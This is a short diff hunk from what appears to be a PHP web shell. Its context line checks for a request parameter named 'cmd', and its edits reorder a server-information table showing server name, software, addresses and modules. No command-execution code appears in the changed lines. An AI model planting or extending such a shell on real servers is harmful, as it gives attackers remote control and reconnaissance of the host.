@@ -205,12 +205,16 @@ if (isset($_REQUEST['cmd'])) {
                         <td><?php echo $_SERVER['SERVER_ADDR']; ?></td>
                     </tr>
                     <tr>
-                        <td>Client IP:</td>
-                        <td><?php echo $_SERVER['REMOTE_ADDR']; ?></td>
+                        <td>Server Name:</td>
+                        <td><?php echo $_SERVER['SERVER_NAME']; ?></td>
                     </tr>
                     <tr>
-                        <td>PHP Version:</td>
-                        <td><?php echo phpversion(); ?></td>
+                        <td>Server Sofware:</td>
+                        <td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td>
+                    </tr>
+                    <tr>
+                        <td>Client IP:</td>
+                        <td><?php echo $_SERVER['REMOTE_ADDR']; ?></td>
                     </tr>
                     <tr>
                         <td>Installed modules:</td>
